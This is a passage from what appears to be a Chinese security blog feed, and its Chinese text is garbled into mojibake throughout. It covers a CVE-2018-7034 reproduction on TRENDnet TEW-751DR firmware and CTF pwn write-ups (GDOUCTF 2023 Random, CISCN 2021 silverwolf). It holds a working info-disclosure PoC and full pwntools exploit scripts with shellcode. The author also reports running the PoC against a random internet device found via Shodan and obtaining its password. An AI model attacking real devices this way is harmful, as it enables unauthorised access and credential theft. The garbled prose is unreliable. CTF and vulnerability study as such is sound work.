class="number">2</span>]);</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°å®ƒå°†&#x3D;ä¸¤è¾¹çš„ä¸œè¥¿éƒ½åˆ†åˆ«å­˜å‚¨åˆ°å¯¹åº”çš„åœ°æ–¹ï¼Œè€Œä¹‹åå¯¹%xxè¿›è¡Œäº†è§£ç ä¹‹åå†æ¬¡è°ƒç”¨funcå°±æ˜¯ä¹‹å‰çš„é‚£ä¸ªå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_405AC0</span><span class="params">(sodj *glocal_addr, _DWORD *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// $a1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *addr )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *addr != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_FILES_&quot;</span>);</span><br><span class="line">    string = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, string);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    v8 = addr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      v9 = <span class="built_in">sobj_get_string</span>(v8);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v9 = &amp;off_420798;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v9);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_FILETYPES_&quot;</span>);</span><br><span class="line">    v10 = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v10);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">61</span>);</span><br><span class="line">    v6 = addr[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = &amp;off_420798;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">    v5 = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v5);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">61</span>);</span><br><span class="line">    v6 = addr[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="built_in">sobj_get_string</span>(v6);</span><br><span class="line">LABEL_11:</span><br><span class="line">  <span class="built_in">sobj_add_string</span>(glocal_addr, v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å°±æ˜¯å°†ç»“æ„ä½“çš„å†…å®¹å­˜åˆ°ç¯å¢ƒå˜é‡é‡Œ</p><h2 id="POCçš„ä¹¦å†™"><a href="#POCçš„ä¹¦å†™" class="headerlink" title="POCçš„ä¹¦å†™"></a>POCçš„ä¹¦å†™</h2><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªPoc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERVICES=DEVICE.ACCOUNT%<span class="number">0</span>aAUTHORIZED_GROUP=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><p>shodanéšä¾¿æ‰¾ä¸€ä¸ª<a href="https://www.shodan.io/search?query=tew-751dr">shodan</a></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244916.png" alt="image-20240708113738832"></p><p>å°±è·å¾—äº†ä»–çš„å¯†ç </p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034</a></p><p><a href="https://www.iotsec-zone.com/article/384">https://www.iotsec-zone.com/article/384</a></p><p><a href="https://zikh26.github.io/posts/5f982ad5.html">https://zikh26.github.io/posts/5f982ad5.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ¼æ´ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#æ¼æ´ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´ä¿¡æ¯&quot;&gt;&lt;/a&gt;æ¼æ´ä¿¡æ¯&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>é¢˜å½•1.2</title>
    <link href="http://s1nec-1o.github.io/2024/06/19/%E9%A2%98%E5%BD%951-2/"/>
    <id>http://s1nec-1o.github.io/2024/06/19/%E9%A2%98%E5%BD%951-2/</id>
    <published>2024-06-19T04:54:02.000Z</published>
    <updated>2024-06-19T04:59:16.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åˆ·é¢˜è®°å½•3"><a href="#åˆ·é¢˜è®°å½•3" class="headerlink" title="åˆ·é¢˜è®°å½•3"></a>åˆ·é¢˜è®°å½•3</h1><h1 id="GDOUCTF-2023-Random"><a href="#GDOUCTF-2023-Random" class="headerlink" title="[GDOUCTF 2023]Random"></a>[GDOUCTF 2023]Random</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258821.png" alt="image-20240514212207480"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258823.png" alt="image-20240514212258989"></p><p>æ˜¾ç„¶ORW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v7 = <span class="number">100</span>;</span><br><span class="line">  sandbox();</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input a guess num:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good guys&quot;</span>);</span><br><span class="line">      vulnerable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no,no,no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸€ä¸ªçŒœéšæœºæ•°ï¼Œç„¶åvulå‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your door&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªæ ˆæº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">haha</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¸­åˆæœ‰ä¸ªjmp rspï¼ŒåŒæ—¶æ ˆä¸Šrwxï¼Œæ˜¾ç„¶ä¾¿æ˜¯åœ¨æ ˆä¸Šæ„é€ orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./RANDOM&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line">orwshell=<span class="string">b&quot;\x48\x89\xc7\x48\x89\xe6\xba\x00\x01\x00\x00\x31\xc0\x0f\x05\xbf\x01\x00\x00\x00\x48\x89\xe6\x6a\x01\x58\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">23245</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="comment"># add_rsp_ret=0x00000000004006aa   # add rsp, 8 ; ret</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">shellcode = shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sub_rsp_call_rsp=<span class="string">b&quot;\x48\x83\xec\x30\xff\xd4&quot;</span></span><br><span class="line">jmp_rsp=<span class="number">0x040094E</span></span><br><span class="line">pal= shellcode +p64(jmp_rsp)+sub_rsp_call_rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    p=run()</span><br><span class="line">    sla(<span class="string">b&#x27;please input a guess num:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.001</span>)</span><br><span class="line">    data=r(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;good&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        sla(<span class="string">b&#x27;your door&#x27;</span>,pal)</span><br><span class="line">        irt()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p>æˆ‘æ˜¯ç›´æ¥çˆ†ç ´æ‰“çš„ï¼Œç”¨shellcraftæ‰“é€šäº†</p><p>ä½†æ˜¯æˆ‘çœ‹ç½‘ä¸Šå¸ˆå‚…çš„ç”¨äº†ä¸€ä¸ªæ–°å¥‡çš„æ‰‹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnModules <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./RANDOM&#x27;</span></span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 28512)</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">rand_result = libc.rand() % <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rand_result)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(rand_result))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨libc.so.6æ¥è·å¾—éšæœºæ•°ç„¶åç›´æ¥è¾“å‡ºï¼Œå¾ˆå¥½çš„æ‰‹æ³•ï¼Œè®©æˆ‘çš„å¤§è„‘æ— é™æ—‹è½¬ï¼Œå­¦åˆ°äº†</p><h1 id="CISCN-2021-åˆèµ›-silverwolf"><a href="#CISCN-2021-åˆèµ›-silverwolf" class="headerlink" title="[CISCN 2021 åˆèµ›]silverwolf"></a>[CISCN 2021 åˆèµ›]silverwolf</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258824.png" alt="image-20240514232649821"></p><p>æ»¡ä¿æŠ¤ï¼Œåèµ·æ¥æ‰“</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258825.png" alt="image-20240514233916232"></p><p>åˆæ˜¯orwï¼Œç´¯äº†</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258826.png" alt="image-20240514234039441"></p><p>è¿˜å› ä¸ºorwè®¾ç½®è§„åˆ™æŠŠå †å¼„å¾—ä¹±ä¸ƒå…«ç³Ÿï¼ŒçœŸç³Ÿå¿ƒ:face_with_thermometer:</p><h2 id="2-27æ‰“setcontextåŠ«æŒæµ"><a href="#2-27æ‰“setcontextåŠ«æŒæµ" class="headerlink" title="2.27æ‰“setcontextåŠ«æŒæµ"></a>2.27æ‰“setcontextåŠ«æŒæµ</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100i 0x7ffff7a34050</span><br><span class="line">   0x7ffff7a34050 &lt;setcontext&gt;:push   rdi</span><br><span class="line">   0x7ffff7a34051 &lt;setcontext+1&gt;:lea    rsi,<span class="section">[rdi+0x128]</span></span><br><span class="line">   0x7ffff7a34058 &lt;setcontext+8&gt;:xor    edx,edx</span><br><span class="line">   0x7ffff7a3405a &lt;setcontext+10&gt;:mov    edi,0x2</span><br><span class="line">   0x7ffff7a3405f &lt;setcontext+15&gt;:mov    r10d,0x8</span><br><span class="line">   0x7ffff7a34065 &lt;setcontext+21&gt;:mov    eax,0xe</span><br><span class="line">   0x7ffff7a3406a &lt;setcontext+26&gt;:syscall </span><br><span class="line">   0x7ffff7a3406c &lt;setcontext+28&gt;:pop    rdi</span><br><span class="line">   0x7ffff7a3406d &lt;setcontext+29&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7a34073 &lt;setcontext+35&gt;:jae    0x7ffff7a340d0 &lt;setcontext+128&gt;</span><br><span class="line">   0x7ffff7a34075 &lt;setcontext+37&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0xe0]</span></span><br><span class="line">   0x7ffff7a3407c &lt;setcontext+44&gt;:fldenv <span class="section">[rcx]</span></span><br><span class="line">   0x7ffff7a3407e &lt;setcontext+46&gt;:ldmxcsr DWORD PTR <span class="section">[rdi+0x1c0]</span></span><br><span class="line">   0x7ffff7a34085 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR <span class="section">[rdi+0xa0]</span></span><br><span class="line">   0x7ffff7a3408c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR <span class="section">[rdi+0x80]</span></span><br><span class="line">   0x7ffff7a34093 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR <span class="section">[rdi+0x78]</span></span><br><span class="line">   0x7ffff7a34097 &lt;setcontext+71&gt;:mov    r12,QWORD PTR <span class="section">[rdi+0x48]</span></span><br><span class="line">   0x7ffff7a3409b &lt;setcontext+75&gt;:mov    r13,QWORD PTR <span class="section">[rdi+0x50]</span></span><br><span class="line">   0x7ffff7a3409f &lt;setcontext+79&gt;:mov    r14,QWORD PTR <span class="section">[rdi+0x58]</span></span><br><span class="line">   0x7ffff7a340a3 &lt;setcontext+83&gt;:mov    r15,QWORD PTR <span class="section">[rdi+0x60]</span></span><br><span class="line">   0x7ffff7a340a7 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0xa8]</span></span><br><span class="line">   0x7ffff7a340ae &lt;setcontext+94&gt;:push   rcx</span><br><span class="line">   0x7ffff7a340af &lt;setcontext+95&gt;:mov    rsi,QWORD PTR <span class="section">[rdi+0x70]</span></span><br><span class="line">   0x7ffff7a340b3 &lt;setcontext+99&gt;:mov    rdx,QWORD PTR <span class="section">[rdi+0x88]</span></span><br><span class="line">   0x7ffff7a340ba &lt;setcontext+106&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0x98]</span></span><br><span class="line">   0x7ffff7a340c1 &lt;setcontext+113&gt;:mov    r8,QWORD PTR <span class="section">[rdi+0x28]</span></span><br><span class="line">   0x7ffff7a340c5 &lt;setcontext+117&gt;:mov    r9,QWORD PTR <span class="section">[rdi+0x30]</span></span><br><span class="line">   0x7ffff7a340c9 &lt;setcontext+121&gt;:mov    rdi,QWORD PTR <span class="section">[rdi+0x68]</span></span><br><span class="line">   0x7ffff7a340cd &lt;setcontext+125&gt;:xor    eax,eax</span><br><span class="line">   0x7ffff7a340cf &lt;setcontext+127&gt;:ret    </span><br></pre></td></tr></table></figure><p>é€šè¿‡gdbæ¥çœ‹setcontextï¼Œä¼šå‘ç°ä»+53å¼€å§‹å¯ä»¥æ§åˆ¶å‡ ä¹æ‰€æœ‰çš„å¯„å­˜å™¨ï¼Œé™¤äº†raxä¼šå˜æˆ0</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a34085 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR <span class="section">[rdi+0xa0]</span> //æˆ–è®¸å¯ä»¥æ ˆè¿ç§»</span><br><span class="line">0x7ffff7a3408c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR <span class="section">[rdi+0x80]</span></span><br><span class="line">0x7ffff7a34093 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR <span class="section">[rdi+0x78]</span></span><br><span class="line">0x7ffff7a34097 &lt;setcontext+71&gt;:mov    r12,QWORD PTR <span class="section">[rdi+0x48]</span></span><br><span class="line">0x7ffff7a3409b &lt;setcontext+75&gt;:mov    r13,QWORD PTR <span class="section">[rdi+0x50]</span></span><br><span class="line">0x7ffff7a3409f &lt;setcontext+79&gt;:mov    r14,QWORD PTR <span class="section">[rdi+0x58]</span></span><br><span class="line">0x7ffff7a340a3 &lt;setcontext+83&gt;:mov    r15,QWORD PTR <span class="section">[rdi+0x60]</span></span><br><span class="line">0x7ffff7a340a7 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0xa8]</span></span><br><span class="line">0x7ffff7a340ae &lt;setcontext+94&gt;:push   rcx</span><br><span class="line">0x7ffff7a340af &lt;setcontext+95&gt;:mov    rsi,QWORD PTR <span class="section">[rdi+0x70]</span></span><br><span class="line">0x7ffff7a340b3 &lt;setcontext+99&gt;:mov    rdx,QWORD PTR <span class="section">[rdi+0x88]</span></span><br><span class="line">0x7ffff7a340ba &lt;setcontext+106&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0x98]</span></span><br><span class="line">0x7ffff7a340c1 &lt;setcontext+113&gt;:mov    r8,QWORD PTR <span class="section">[rdi+0x28]</span></span><br><span class="line">0x7ffff7a340c5 &lt;setcontext+117&gt;:mov    r9,QWORD PTR <span class="section">[rdi+0x30]</span></span><br><span class="line">0x7ffff7a340c9 &lt;setcontext+121&gt;:mov    rdi,QWORD PTR <span 